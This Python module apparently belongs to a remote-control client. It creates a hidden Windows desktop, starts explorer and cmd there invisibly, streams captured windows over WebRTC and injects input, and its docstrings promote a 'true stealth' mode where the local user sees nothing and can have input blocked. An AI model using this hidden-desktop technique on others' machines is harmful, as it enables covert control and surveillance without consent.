"""Hidden desktop helpers for Windows manage sessions.

Supports two modes:
1. Virtual Display Mode (recommended): Uses IDD driver to create a real virtual
   monitor that can be captured. Provides true isolation - client sees nothing.
2. Fallback Mode: Captures from primary display, input goes to main desktop.
   Client can see operator's actions.
"""
from __future__ import annotations

import asyncio
import ctypes
import logging
import os
import platform
import queue
import subprocess
import threading
import time
import uuid
from fractions import Fraction

from aiortc import MediaStreamTrack
from aiortc.mediastreams import MediaStreamError, VIDEO_CLOCK_RATE, VIDEO_TIME_BASE
from av.video.frame import VideoFrame

from remote_client.control.input_controller import (
    _SendInputFallback,
    ControlCommand,
    MouseClick,
    MouseDown,
    MouseMove,
    MouseScroll,
    MouseUp,
    KeyDown,
    KeyPress,
    KeyUp,
    TextInput,
)
from remote_client.apps.launcher import resolve_app_executable
from remote_client.media.stream_profiles import AdaptiveStreamProfile

logger = logging.getLogger(__name__)

# Try to import virtual display support
try:
    from remote_client.windows.virtual_display import (
        VirtualDisplaySession,
        check_virtual_display_support,
    )
    VIRTUAL_DISPLAY_AVAILABLE = True
except ImportError:
    VIRTUAL_DISPLAY_AVAILABLE = False
    VirtualDisplaySession = None

if platform.system() == "Windows":
    from ctypes import wintypes

    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32

    DESKTOP_READOBJECTS = 0x0001
    DESKTOP_CREATEWINDOW = 0x0002
    DESKTOP_CREATEMENU = 0x0004
    DESKTOP_HOOKCONTROL = 0x0008
    DESKTOP_JOURNALRECORD = 0x0010
    DESKTOP_JOURNALPLAYBACK = 0x0020
    DESKTOP_ENUMERATE = 0x0040
    DESKTOP_WRITEOBJECTS = 0x0080
    DESKTOP_SWITCHDESKTOP = 0x0100
    DESKTOP_ACCESS = (
        DESKTOP_READOBJECTS
        | DESKTOP_CREATEWINDOW
        | DESKTOP_CREATEMENU
        | DESKTOP_HOOKCONTROL
        | DESKTOP_JOURNALRECORD
        | DESKTOP_JOURNALPLAYBACK
        | DESKTOP_ENUMERATE
        | DESKTOP_WRITEOBJECTS
        | DESKTOP_SWITCHDESKTOP
    )

    SRCCOPY = 0x00CC0020
    DIB_RGB_COLORS = 0
    BI_RGB = 0
    HORZRES = 8
    VERTRES = 10
    SM_CXSCREEN = 0
    SM_CYSCREEN = 1

    class BITMAPINFOHEADER(ctypes.Structure):
        _fields_ = [
            ("biSize", wintypes.DWORD),
            ("biWidth", wintypes.LONG),
            ("biHeight", wintypes.LONG),
            ("biPlanes", wintypes.WORD),
            ("biBitCount", wintypes.WORD),
            ("biCompression", wintypes.DWORD),
            ("biSizeImage", wintypes.DWORD),
            ("biXPelsPerMeter", wintypes.LONG),
            ("biYPelsPerMeter", wintypes.LONG),
            ("biClrUsed", wintypes.DWORD),
            ("biClrImportant", wintypes.DWORD),
        ]

    class BITMAPINFO(ctypes.Structure):
        _fields_ = [("bmiHeader", BITMAPINFOHEADER), ("bmiColors", wintypes.DWORD * 3)]

    class RECT(ctypes.Structure):
        _fields_ = [
            ("left", wintypes.LONG),
            ("top", wintypes.LONG),
            ("right", wintypes.LONG),
            ("bottom", wintypes.LONG),
        ]

    class SECURITY_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ("nLength", wintypes.DWORD),
            ("lpSecurityDescriptor", wintypes.LPVOID),
            ("bInheritHandle", wintypes.BOOL),
        ]

    user32.CreateDesktopW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.LPVOID,
        wintypes.DWORD,
        wintypes.DWORD,
        ctypes.POINTER(SECURITY_ATTRIBUTES),
    ]
    user32.CreateDesktopW.restype = wintypes.HANDLE
    user32.CloseDesktop.argtypes = [wintypes.HANDLE]
    user32.CloseDesktop.restype = wintypes.BOOL
    user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
    user32.SetThreadDesktop.restype = wintypes.BOOL
    user32.GetThreadDesktop.argtypes = [wintypes.DWORD]
    user32.GetThreadDesktop.restype = wintypes.HANDLE
    user32.BlockInput.argtypes = [wintypes.BOOL]
    user32.BlockInput.restype = wintypes.BOOL
    user32.GetDesktopWindow.argtypes = []
    user32.GetDesktopWindow.restype = wintypes.HWND
    user32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(RECT)]
    user32.GetWindowRect.restype = wintypes.BOOL
    user32.GetWindowDC.argtypes = [wintypes.HWND]
    user32.GetWindowDC.restype = wintypes.HDC
    user32.GetDC.argtypes = [wintypes.HWND]
    user32.GetDC.restype = wintypes.HDC
    user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
    user32.ReleaseDC.restype = wintypes.INT
    user32.GetSystemMetrics.argtypes = [wintypes.INT]
    user32.GetSystemMetrics.restype = wintypes.INT

    gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
    gdi32.CreateCompatibleDC.restype = wintypes.HDC
    gdi32.CreateDCW.argtypes = [
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.LPCWSTR,
        wintypes.LPVOID,
    ]
    gdi32.CreateDCW.restype = wintypes.HDC
    gdi32.DeleteDC.argtypes = [wintypes.HDC]
    gdi32.DeleteDC.restype = wintypes.BOOL
    gdi32.GetDeviceCaps.argtypes = [wintypes.HDC, wintypes.INT]
    gdi32.GetDeviceCaps.restype = wintypes.INT
    gdi32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, wintypes.INT, wintypes.INT]
    gdi32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
    gdi32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
    gdi32.SelectObject.restype = wintypes.HGDIOBJ
    gdi32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
    gdi32.DeleteObject.restype = wintypes.BOOL
    gdi32.BitBlt.argtypes = [
        wintypes.HDC,
        wintypes.INT,
        wintypes.INT,
        wintypes.INT,
        wintypes.INT,
        wintypes.HDC,
        wintypes.INT,
        wintypes.INT,
        wintypes.DWORD,
    ]
    gdi32.BitBlt.restype = wintypes.BOOL
    gdi32.GetDIBits.argtypes = [
        wintypes.HDC,
        wintypes.HBITMAP,
        wintypes.UINT,
        wintypes.UINT,
        wintypes.LPVOID,
        ctypes.POINTER(BITMAPINFO),
        wintypes.UINT,
    ]
    gdi32.GetDIBits.restype = wintypes.INT


def _resolve_app_executable(app_name: str) -> str | None:
    return resolve_app_executable(app_name)


def _create_desktop(name: str):
    if platform.system() != "Windows":
        raise RuntimeError("Hidden desktop is only supported on Windows.")
    sa = SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(SECURITY_ATTRIBUTES)
    sa.lpSecurityDescriptor = None
    sa.bInheritHandle = 0
    handle = user32.CreateDesktopW(name, None, None, 0, DESKTOP_ACCESS, ctypes.byref(sa))
    if not handle:
        raise ctypes.WinError()
    return handle


def _close_desktop(handle) -> None:
    if not handle:
        return
    try:
        user32.CloseDesktop(handle)
    except Exception:
        return


def _set_thread_desktop(handle) -> bool:
    if not handle:
        return False
    if not user32.SetThreadDesktop(handle):
        logger.warning("SetThreadDesktop failed: %s", ctypes.WinError())
        return False
    return True


def _toggle_block_input(enabled: bool) -> bool:
    if platform.system() != "Windows":
        return False
    try:
        return bool(user32.BlockInput(1 if enabled else 0))
    except Exception:
        logger.warning("BlockInput failed.")
        return False


def _get_screen_size() -> tuple[int, int]:
    """Get screen size using GetSystemMetrics (works for current thread's desktop)."""
    width = user32.GetSystemMetrics(SM_CXSCREEN)
    height = user32.GetSystemMetrics(SM_CYSCREEN)
    return width, height


def _create_screen_dc():
    """Create a DC for the entire screen of current thread's desktop using GetDC(NULL)."""
    hdc = user32.GetDC(None)
    if not hdc:
        return None, 0, 0, None
    
    width, height = _get_screen_size()
    if width <= 0 or height <= 0:
        width = gdi32.GetDeviceCaps(hdc, HORZRES)
        height = gdi32.GetDeviceCaps(hdc, VERTRES)

    def _cleanup() -> None:
        try:
            user32.ReleaseDC(None, hdc)
        except Exception:
            pass

    return hdc, width, height, _cleanup


def _create_display_dc():
    """Create a DC for the display using CreateDCW."""
    create_dc = getattr(gdi32, "CreateDCW", None)
    if create_dc is None:
        return None, 0, 0, None
    hdc = create_dc("DISPLAY", None, None, None)
    if not hdc:
        return None, 0, 0, None
    width = int(gdi32.GetDeviceCaps(hdc, HORZRES))
    height = int(gdi32.GetDeviceCaps(hdc, VERTRES))

    def _cleanup() -> None:
        try:
            gdi32.DeleteDC(hdc)
        except Exception:
            pass

    return hdc, width, height, _cleanup


class HiddenDesktopCapture:
    """Capture screen using mss.
    
    Supports two modes:
    1. Virtual Display Mode: Captures from a virtual monitor (if available)
    2. Fallback Mode: Captures from the primary display
    """
    
    def __init__(
        self,
        desktop_handle,
        desktop_path: str | None = None,
        draw_cursor: bool = False,
        fps: int = 30,
        monitor_index: int | None = None,
        monitor_region: dict | None = None,
    ) -> None:
        self._desktop_handle = desktop_handle
        self._desktop_path = desktop_path
        self._draw_cursor = bool(draw_cursor)
        self._interval_lock = threading.Lock()
        self._interval = 1.0 / max(1, fps)
        self._stop_event = threading.Event()
        self._frame_lock = threading.Lock()
        self._frame: bytes | None = None
        self._frame_size = (0, 0)
        self._sct = None
        self._monitor = None
        self._target_monitor_index = monitor_index
        self._target_monitor_region = monitor_region
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    @property
    def frame_size(self) -> tuple[int, int]:
        return self._frame_size

    def set_fps(self, fps: int) -> None:
        with self._interval_lock:
            self._interval = 1.0 / max(1, int(fps))

    def set_draw_cursor(self, enabled: bool) -> None:
        self._draw_cursor = bool(enabled)
    
    def set_monitor(self, index: int | None = None, region: dict | None = None) -> None:
        """Change the monitor to capture from."""
        self._target_monitor_index = index
        self._target_monitor_region = region
        # Will be applied on next capture cycle

    def get_frame(self, timeout: float = 0.6) -> tuple[bytes | None, tuple[int, int]]:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            with self._frame_lock:
                if self._frame is not None:
                    return self._frame, self._frame_size
            time.sleep(0.01)
        return None, self._frame_size

    def close(self) -> None:
        self._stop_event.set()
        if self._thread.is_alive():
            self._thread.join(timeout=1.5)
        if self._sct:
            try:
                self._sct.close()
            except Exception:
                pass
            self._sct = None

    def _init_mss(self) -> bool:
        """Initialize mss for screen capture."""
        try:
            import mss
            self._sct = mss.mss()
            return self._select_monitor()
        except Exception as exc:
            logger.warning("Hidden desktop: mss init failed: %s", exc)
            return False
    
    def _select_monitor(self) -> bool:
        """Select the monitor to capture from."""
        if not self._sct:
            return False
        
        monitors = self._sct.monitors
        if not monitors:
            logger.warning("Hidden desktop: no monitors found")
            return False
        
        # Priority 1: Use specified region (for virtual display)
        if self._target_monitor_region:
            self._monitor = self._target_monitor_region
            self._frame_size = (
                int(self._monitor["width"]),
                int(self._monitor["height"]),
            )
            logger.info("Hidden desktop: using custom region, size=%dx%d", 
                        self._frame_size[0], self._frame_size[1])
            return True
        
        # Priority 2: Use specified monitor index
        if self._target_monitor_index is not None:
            if self._target_monitor_index < len(monitors):
                self._monitor = monitors[self._target_monitor_index]
                self._frame_size = (
                    int(self._monitor["width"]),
                    int(self._monitor["height"]),
                )
                logger.info("Hidden desktop: using monitor %d, size=%dx%d", 
                            self._target_monitor_index, 
                            self._frame_size[0], self._frame_size[1])
                return True
        
        # Fallback: Use primary monitor (index 1) or full virtual screen (index 0)
        index = 1 if len(monitors) > 1 else 0
        self._monitor = monitors[index]
        self._frame_size = (
            int(self._monitor["width"]),
            int(self._monitor["height"]),
        )
        logger.info("Hidden desktop: using primary monitor %d, size=%dx%d", 
                    index, self._frame_size[0], self._frame_size[1])
        return True

    def _capture_mss(self) -> bytes | None:
        """Capture frame using mss."""
        if not self._sct or not self._monitor:
            return None
        try:
            shot = self._sct.grab(self._monitor)
            # mss returns BGRA format
            return shot.raw
        except Exception as exc:
            logger.debug("Hidden desktop: mss grab failed: %s", exc)
            return None

    def _run(self) -> None:
        # Initialize mss for capturing
        if not self._init_mss():
            logger.error("Hidden desktop: failed to initialize screen capture")
            return

        try:
            while not self._stop_event.is_set():
                start = time.monotonic()
                
                # Check if monitor needs to be updated
                if self._target_monitor_region or self._target_monitor_index is not None:
                    self._select_monitor()
                
                data = self._capture_mss()
                if data:
                    with self._frame_lock:
                        self._frame = data
                with self._interval_lock:
                    interval = self._interval
                elapsed = time.monotonic() - start
                sleep_for = max(0.0, interval - elapsed)
                if sleep_for:
                    self._stop_event.wait(sleep_for)
        finally:
            if self._sct:
                try:
                    self._sct.close()
                except Exception:
                    pass
                self._sct = None


class HiddenDesktopTrack(MediaStreamTrack):
    kind = "video"

    def __init__(self, capture: HiddenDesktopCapture, profile: str = "balanced") -> None:
        super().__init__()
        self._capture = capture
        native_size = capture.frame_size
        if native_size == (0, 0):
            native_size = (1280, 720)
        self._profile = AdaptiveStreamProfile(native_size, profile=profile)
        self._target_size = self._profile.target_size
        self._target_fps = self._profile.target_fps
        self._timestamp = 0
        self._start: float | None = None
        self._last_frame_ts: float | None = None

    def set_profile(
        self,
        profile: str | None,
        width: int | None,
        height: int | None,
        fps: int | None,
    ) -> None:
        self._profile.apply_profile(profile, width, height, fps)
        self._target_size = self._profile.target_size
        self._target_fps = self._profile.target_fps
        if fps:
            self._capture.set_fps(fps)

    def set_draw_cursor(self, enabled: bool) -> None:
        self._capture.set_draw_cursor(enabled)

    async def _next_timestamp(self) -> tuple[int, Fraction]:
        if self.readyState != "live":
            raise MediaStreamError
        if self._start is None:
            self._start = time.time()
            self._timestamp = 0
            return self._timestamp, VIDEO_TIME_BASE
        fps = self._target_fps if self._target_fps > 0 else 30
        increment = int(VIDEO_CLOCK_RATE / fps)
        self._timestamp += increment
        wait = self._start + (self._timestamp / VIDEO_CLOCK_RATE) - time.time()
        if wait > 0:
            await asyncio.sleep(wait)
        return self._timestamp, VIDEO_TIME_BASE

    async def recv(self) -> VideoFrame:
        pts, time_base = await self._next_timestamp()
        start = time.monotonic()
        data, size = self._capture.get_frame()
        width, height = size
        if not data or width <= 0 or height <= 0:
            frame = VideoFrame(width=self._target_size[0], height=self._target_size[1], format="bgr24")
            for plane in frame.planes:
                plane.update(bytes(plane.buffer_size))
        else:
            frame = VideoFrame(width=width, height=height, format="bgra")
            frame.planes[0].update(data)
            if self._target_size and (width, height) != self._target_size:
                frame = frame.reformat(width=self._target_size[0], height=self._target_size[1])
        now = time.monotonic()
        if self._last_frame_ts is not None:
            self._profile.add_fps_sample(now - self._last_frame_ts)
        self._last_frame_ts = now
        if self._profile.maybe_adjust(now - start, now=now):
            self._target_size = self._profile.target_size
            self._target_fps = self._profile.target_fps
        frame.pts = pts
        frame.time_base = time_base
        return frame

    def stop(self) -> None:
        self._capture.close()
        super().stop()


class HiddenDesktopInputController:
    """Input controller that sends input to the PRIMARY desktop.
    
    Since we capture from the main screen (hidden desktops have no graphical buffer),
    input must also go to the main desktop for the user to see the effects.
    """
    
    def __init__(self, desktop_handle, screen_size: tuple[int, int]) -> None:
        self._desktop_handle = desktop_handle  # Kept for API compatibility
        self._screen_size = screen_size
        self._queue: queue.Queue[ControlCommand] = queue.Queue()
        self._stop_event = threading.Event()
        self._fallback = _SendInputFallback()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def set_screen_size(self, size: tuple[int, int]) -> None:
        self._screen_size = size

    def execute(self, command: ControlCommand) -> None:
        if not self._stop_event.is_set():
            self._queue.put(command)

    def close(self) -> None:
        self._stop_event.set()
        if self._thread.is_alive():
            self._thread.join(timeout=1.0)

    @staticmethod
    def _normalize_scroll_delta(value: int | None) -> int:
        if value is None:
            return 0
        try:
            delta = int(value)
        except (TypeError, ValueError):
            return 0
        if delta == 0:
            return 0
        step = int(round(delta / 120))
        if step == 0:
            step = 1 if delta > 0 else -1
        return step

    def _scale_coordinates(
        self,
        x: int,
        y: int,
        source_width: int | None,
        source_height: int | None,
    ) -> tuple[int, int]:
        if not source_width or not source_height:
            return x, y
        screen_width, screen_height = self._screen_size
        if screen_width <= 0 or screen_height <= 0:
            return x, y
        scaled_x = int(round(x * screen_width / source_width))
        scaled_y = int(round(y * screen_height / source_height))
        scaled_x = max(0, min(screen_width - 1, scaled_x))
        scaled_y = max(0, min(screen_height - 1, scaled_y))
        return scaled_x, scaled_y

    def _execute_command(self, command: ControlCommand) -> None:
        screen_width, screen_height = self._screen_size
        if isinstance(command, MouseMove):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.move(x, y, screen_width, screen_height)
        elif isinstance(command, MouseClick):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.click(command.button, screen_width, screen_height, x, y)
        elif isinstance(command, MouseDown):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.mouse_down(command.button, screen_width, screen_height, x, y)
        elif isinstance(command, MouseUp):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._fallback.mouse_up(command.button, screen_width, screen_height, x, y)
        elif isinstance(command, MouseScroll):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            delta_x = self._normalize_scroll_delta(command.delta_x)
            delta_y = -self._normalize_scroll_delta(command.delta_y)
            if delta_x or delta_y:
                self._fallback.scroll(delta_x, delta_y, screen_width, screen_height, x, y)
        elif isinstance(command, KeyPress):
            self._fallback.keypress(command.key)
        elif isinstance(command, KeyDown):
            self._fallback.key_down(command.key)
        elif isinstance(command, KeyUp):
            self._fallback.key_up(command.key)
        elif isinstance(command, TextInput):
            if command.text:
                self._fallback.text(command.text)

    def _run(self) -> None:
        # DO NOT switch to hidden desktop - input goes to main desktop
        # since we're capturing from main screen (hidden desktop has no graphical buffer)
        logger.info("Hidden desktop input controller started (input goes to main desktop)")
        while not self._stop_event.is_set():
            try:
                command = self._queue.get(timeout=0.2)
            except queue.Empty:
                continue
            try:
                self._execute_command(command)
            except Exception:
                logger.exception("Hidden desktop input failed.")


class HiddenDesktopSession:
    """Hidden desktop session with optional virtual display support.
    
    When virtual display is available and enabled:
    - Creates a virtual monitor that only the operator can see
    - Client sees nothing - true stealth mode
    - Input is sent to the virtual display coordinates
    
    When virtual display is not available (fallback):
    - Captures from the primary display
    - Client can see what operator is doing
    - Input goes to the main desktop
    """
    
    def __init__(self, use_virtual_display: bool = True) -> None:
        if platform.system() != "Windows":
            raise RuntimeError("Hidden desktop is only supported on Windows.")
        
        self._desktop_name = f"rc_hidden_{uuid.uuid4().hex}"
        self._desktop_handle = _create_desktop(self._desktop_name)
        self._desktop_path = f"WinSta0\\{self._desktop_name}"
        self._processes: list[subprocess.Popen] = []
        self._input_blocked = False
        self._virtual_display: VirtualDisplaySession | None = None
        self._use_virtual_display = use_virtual_display and VIRTUAL_DISPLAY_AVAILABLE
        self._virtual_display_active = False
        
        self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
            "1",
            "true",
            "yes",
            "on",
        }
        
        # Try to initialize virtual display
        monitor_index = None
        monitor_region = None
        
        if self._use_virtual_display:
            self._virtual_display_active = self._init_virtual_display()
            if self._virtual_display_active and self._virtual_display:
                monitor_region = self._virtual_display.get_capture_region()
                logger.info("Hidden desktop: using virtual display for capture")
            else:
                logger.info("Hidden desktop: virtual display not available, using primary monitor")
        
        self._start_shell()

        self._capture = HiddenDesktopCapture(
            self._desktop_handle,
            desktop_path=self._desktop_path,
            draw_cursor=False,
            fps=30,
            monitor_index=monitor_index,
            monitor_region=monitor_region,
        )
        size = self._capture.frame_size
        deadline = time.monotonic() + 1.0
        while size == (0, 0) and time.monotonic() < deadline:
            time.sleep(0.05)
            size = self._capture.frame_size
        
        self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
        self.input_controller = HiddenDesktopInputController(self._desktop_handle, size)
        
        if self._block_local_input:
            self.block_local_input()
    
    def _init_virtual_display(self) -> bool:
        """Initialize virtual display if available."""
        if not VIRTUAL_DISPLAY_AVAILABLE or VirtualDisplaySession is None:
            return False
        
        try:
            self._virtual_display = VirtualDisplaySession()
            # Try to start with 1920x1080 resolution
            if self._virtual_display.start(width=1920, height=1080, auto_install=False):
                logger.info("Virtual display started: %dx%d", 
                            *self._virtual_display.resolution)
                return True
            else:
                logger.warning("Failed to start virtual display")
                self._virtual_display = None
                return False
        except Exception as exc:
            logger.warning("Virtual display initialization failed: %s", exc)
            self._virtual_display = None
            return False

    def _start_shell(self) -> None:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        for cmd in ("explorer.exe", "cmd.exe"):
            try:
                proc = subprocess.Popen([cmd], startupinfo=startupinfo)
                self._processes.append(proc)
            except Exception as exc:
                logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)
        # Give explorer.exe time to initialize the desktop shell
        time.sleep(0.5)

    def launch_application(self, app_name: str) -> None:
        exe = _resolve_app_executable(app_name)
        if not exe:
            raise FileNotFoundError(app_name)
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        proc = subprocess.Popen([exe], startupinfo=startupinfo)
        self._processes.append(proc)

    def block_local_input(self) -> bool:
        if self._input_blocked:
            return True
        self._input_blocked = _toggle_block_input(True)
        if not self._input_blocked:
            logger.warning("Hidden desktop: failed to block local input.")
        return self._input_blocked

    def unblock_local_input(self) -> None:
        if self._input_blocked:
            _toggle_block_input(False)
            self._input_blocked = False
    
    @property
    def is_virtual_display_active(self) -> bool:
        """Check if virtual display is being used."""
        return self._virtual_display_active
    
    @property
    def mode(self) -> str:
        """Get the current operating mode."""
        if self._virtual_display_active:
            return "virtual_display"
        return "fallback"

    def close(self) -> None:
        self.screen_track.stop()
        self.input_controller.close()
        self.unblock_local_input()
        
        # Stop virtual display
        if self._virtual_display:
            try:
                self._virtual_display.stop()
            except Exception:
                pass
            self._virtual_display = None
        
        for proc in self._processes:
            try:
                proc.terminate()
            except Exception:
                pass
        self._processes.clear()
        _close_desktop(self._desktop_handle)
        self._desktop_handle = None


# Try to import PrintWindow-based capture
try:
    from remote_client.windows.window_capture import (
        WindowCaptureSession,
        WindowInputController,
        WindowInfo,
    )
    PRINTWINDOW_AVAILABLE = True
except ImportError:
    PRINTWINDOW_AVAILABLE = False
    WindowCaptureSession = None
    WindowInputController = None


class PrintWindowCapture:
    """Adapter for WindowCaptureSession to match HiddenDesktopCapture interface."""
    
    def __init__(
        self,
        desktop_handle,
        fps: int = 30,
        width: int = 1920,
        height: int = 1080,
    ) -> None:
        self._desktop_handle = desktop_handle
        self._session = WindowCaptureSession(
            desktop_handle=desktop_handle,
            width=width,
            height=height,
            fps=fps,
        )
        self._session.start()
    
    @property
    def frame_size(self) -> tuple[int, int]:
        return self._session.frame_size
    
    def set_fps(self, fps: int) -> None:
        self._session.set_fps(fps)
    
    def set_draw_cursor(self, enabled: bool) -> None:
        # PrintWindow doesn't support cursor drawing
        pass
    
    def get_frame(self, timeout: float = 0.6) -> tuple[bytes | None, tuple[int, int]]:
        return self._session.get_frame(timeout)
    
    def get_windows(self) -> list:
        """Get list of tracked windows."""
        return self._session.windows
    
    def close(self) -> None:
        self._session.stop()


class PrintWindowInputController:
    """Input controller adapter for PrintWindow mode."""
    
    def __init__(
        self,
        desktop_handle,
        capture: PrintWindowCapture,
        screen_size: tuple[int, int],
    ) -> None:
        self._desktop_handle = desktop_handle
        self._capture = capture
        self._screen_size = screen_size
        self._queue: queue.Queue[ControlCommand] = queue.Queue()
        self._stop_event = threading.Event()
        self._controller = WindowInputController(capture.get_windows)
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
    
    def set_screen_size(self, size: tuple[int, int]) -> None:
        self._screen_size = size
    
    def execute(self, command: ControlCommand) -> None:
        if not self._stop_event.is_set():
            self._queue.put(command)
    
    def close(self) -> None:
        self._stop_event.set()
        if self._thread.is_alive():
            self._thread.join(timeout=1.0)
    
    def _scale_coordinates(
        self,
        x: int,
        y: int,
        source_width: int | None,
        source_height: int | None,
    ) -> tuple[int, int]:
        if not source_width or not source_height:
            return x, y
        screen_width, screen_height = self._screen_size
        if screen_width <= 0 or screen_height <= 0:
            return x, y
        scaled_x = int(round(x * screen_width / source_width))
        scaled_y = int(round(y * screen_height / source_height))
        scaled_x = max(0, min(screen_width - 1, scaled_x))
        scaled_y = max(0, min(screen_height - 1, scaled_y))
        return scaled_x, scaled_y
    
    def _execute_command(self, command: ControlCommand) -> None:
        screen_width, screen_height = self._screen_size
        
        if isinstance(command, MouseMove):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._controller.mouse_move(x, y)
        elif isinstance(command, MouseClick):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._controller.mouse_click(x, y, command.button)
        elif isinstance(command, MouseDown):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._controller.mouse_down(x, y, command.button)
        elif isinstance(command, MouseUp):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            self._controller.mouse_up(x, y, command.button)
        elif isinstance(command, MouseScroll):
            x, y = self._scale_coordinates(
                command.x, command.y, command.source_width, command.source_height
            )
            delta_x = command.delta_x or 0
            delta_y = -(command.delta_y or 0)
            self._controller.mouse_scroll(x, y, delta_x, delta_y)
        elif isinstance(command, KeyPress):
            # Convert key string to VK code
            vk_code = self._key_to_vk(command.key)
            if vk_code:
                self._controller.key_down(vk_code)
                time.sleep(0.02)
                self._controller.key_up(vk_code)
        elif isinstance(command, KeyDown):
            vk_code = self._key_to_vk(command.key)
            if vk_code:
                self._controller.key_down(vk_code)
        elif isinstance(command, KeyUp):
            vk_code = self._key_to_vk(command.key)
            if vk_code:
                self._controller.key_up(vk_code)
        elif isinstance(command, TextInput):
            if command.text:
                self._controller.type_text(command.text)
    
    def _key_to_vk(self, key: str) -> int | None:
        """Convert key string to Windows virtual key code."""
        if not key:
            return None
        
        # Common key mappings
        key_map = {
            "enter": 0x0D,
            "return": 0x0D,
            "tab": 0x09,
            "escape": 0x1B,
            "esc": 0x1B,
            "backspace": 0x08,
            "delete": 0x2E,
            "insert": 0x2D,
            "home": 0x24,
            "end": 0x23,
            "pageup": 0x21,
            "pagedown": 0x22,
            "up": 0x26,
            "down": 0x28,
            "left": 0x25,
            "right": 0x27,
            "space": 0x20,
            "shift": 0x10,
            "ctrl": 0x11,
            "control": 0x11,
            "alt": 0x12,
            "menu": 0x12,
            "win": 0x5B,
            "windows": 0x5B,
            "f1": 0x70,
            "f2": 0x71,
            "f3": 0x72,
            "f4": 0x73,
            "f5": 0x74,
            "f6": 0x75,
            "f7": 0x76,
            "f8": 0x77,
            "f9": 0x78,
            "f10": 0x79,
            "f11": 0x7A,
            "f12": 0x7B,
        }
        
        key_lower = key.lower()
        if key_lower in key_map:
            return key_map[key_lower]
        
        # Single character
        if len(key) == 1:
            return ord(key.upper())
        
        return None
    
    def _run(self) -> None:
        logger.info("PrintWindow input controller started")
        while not self._stop_event.is_set():
            try:
                command = self._queue.get(timeout=0.2)
            except queue.Empty:
                continue
            try:
                self._execute_command(command)
            except Exception:
                logger.exception("PrintWindow input failed.")


class HiddenWindowSession:
    """Hidden window session using PrintWindow API.
    
    This mode captures windows directly using PrintWindow API, compositing
    them into a single frame. No driver installation required.
    
    Advantages:
    - No driver installation
    - True stealth - client sees nothing
    - Works with any Windows version
    
    How it works:
    1. Creates a hidden Windows Desktop
    2. Launches applications on that desktop
    3. Captures window contents via PrintWindow API
    4. Composites windows into a single frame
    5. Sends input via PostMessage to target windows
    """
    
    def __init__(self, width: int = 1920, height: int = 1080, fps: int = 30) -> None:
        if platform.system() != "Windows":
            raise RuntimeError("Hidden window session is only supported on Windows.")
        
        if not PRINTWINDOW_AVAILABLE:
            raise RuntimeError("PrintWindow capture module not available.")
        
        self._width = width
        self._height = height
        self._fps = fps
        
        self._desktop_name = f"rc_hidden_{uuid.uuid4().hex}"
        self._desktop_handle = _create_desktop(self._desktop_name)
        self._desktop_path = f"WinSta0\\{self._desktop_name}"
        self._processes: list[subprocess.Popen] = []
        self._input_blocked = False
        
        self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
            "1",
            "true",
            "yes",
            "on",
        }
        
        # Start shell on hidden desktop
        self._start_shell()
        
        # Initialize PrintWindow capture
        self._capture = PrintWindowCapture(
            desktop_handle=self._desktop_handle,
            fps=fps,
            width=width,
            height=height,
        )
        
        # Wait for capture to initialize
        size = self._capture.frame_size
        deadline = time.monotonic() + 2.0
        while size == (0, 0) and time.monotonic() < deadline:
            time.sleep(0.1)
            size = self._capture.frame_size
        
        # Create track for WebRTC
        self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
        
        # Create input controller
        self.input_controller = PrintWindowInputController(
            self._desktop_handle,
            self._capture,
            size,
        )
        
        if self._block_local_input:
            self.block_local_input()
        
        logger.info("HiddenWindowSession started (PrintWindow mode)")
    
    def _start_shell(self) -> None:
        """Start explorer and cmd on hidden desktop."""
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.lpDesktop = self._desktop_path
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        for cmd in ("explorer.exe", "cmd.exe"):
            try:
                proc = subprocess.Popen([cmd], startupinfo=startupinfo)
                self._processes.append(proc)
            except Exception as exc:
                logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)
        
        # Give explorer time to initialize
